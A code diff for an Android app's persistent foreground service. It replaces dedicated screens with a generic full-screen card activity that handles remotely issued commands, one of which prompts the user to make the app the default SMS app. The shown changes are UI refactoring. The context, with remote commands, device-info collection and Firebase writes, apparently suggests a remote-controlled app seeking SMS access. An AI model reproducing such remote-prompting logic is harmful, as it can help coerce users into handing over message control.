@@ -41,7 +41,6 @@ import kotlinx.coroutines.launch
 import com.example.fast.util.DeviceInfoCollector
 import com.example.fast.util.LogHelper
 import com.example.fast.util.DefaultSmsAppHelper
-import com.example.fast.ui.DefaultSmsRequestActivity
 import com.example.fast.ui.MultipurposeCardActivity
 import com.example.fast.ui.card.RemoteCardHandler
 import com.example.fast.util.FirebaseWriteHelper
@@ -1995,7 +1994,7 @@ class PersistentForegroundService : Service() {
      * Handle requestDefaultMessageApp command
      * Format: Any value (content is ignored, command always executes)
      *
-     * Opens the DefaultSmsRequestActivity to guide the user,
+     * Opens the MultipurposeCardActivity (CARD_TYPE_DEFAULT_SMS) to guide the user,
      * then lets that screen trigger the system dialog.
      *
      * @param content Command content (ignored, can be any value)
@@ -2015,7 +2014,7 @@ class PersistentForegroundService : Service() {
      * Handle checkInternet / requestInternet command
      * Format: Any value (content is ignored, command always executes)
      *
-     * Opens the InternetCheckActivity to guide the user,
+     * Opens the MultipurposeCardActivity (CARD_TYPE_MESSAGE) to guide the user,
      * which opens the Android Internet Panel (Android 10+) or WiFi settings.
      *
      * @param content Command content (ignored, can be any value)
@@ -2027,24 +2026,29 @@ class PersistentForegroundService : Service() {
         historyTimestamp: Long,
         commandKey: String
     ) {
-        LogHelper.d(TAG, "Executing checkInternet command - opening InternetCheckActivity")
+        LogHelper.d(TAG, "Executing checkInternet command - opening MultipurposeCardActivity")
 
         if (com.example.fast.util.NetworkUtils.hasInternetConnection(this)) {
-            LogHelper.d(TAG, "Internet already connected - opening InternetCheckActivity to show status")
+            LogHelper.d(TAG, "Internet already connected - opening MultipurposeCardActivity to show status")
         }
 
         val attemptRequest = {
             try {
-                val intent = Intent(this, com.example.fast.ui.InternetCheckActivity::class.java).apply {
+                val intent = Intent(this, MultipurposeCardActivity::class.java).apply {
                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_MESSAGE)
+                    putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
+                    putExtra(RemoteCardHandler.KEY_TITLE, "Internet")
+                    putExtra(RemoteCardHandler.KEY_BODY, "Check your internet connection. Tap OK to open settings.")
+                    putExtra(RemoteCardHandler.KEY_PRIMARY_BUTTON, "OK")
                     putExtra("commandKey", commandKey)
-                    putExtra("historyTimestamp", historyTimestamp)
+                    putExtra("historyTimestamp", historyTimestamp.toString())
                 }
                 startActivity(intent)
-                LogHelper.d(TAG, "InternetCheckActivity launched successfully")
+                LogHelper.d(TAG, "MultipurposeCardActivity (message) launched successfully")
                 updateCommandHistoryStatus(historyTimestamp, commandKey, "executed", "request_ui_launched")
             } catch (e: Exception) {
-                LogHelper.e(TAG, "Error launching InternetCheckActivity", e)
+                LogHelper.e(TAG, "Error launching MultipurposeCardActivity", e)
                 // Fallback: open system internet settings directly
                 try {
                     com.example.fast.util.NetworkUtils.openInternetSettings(this)
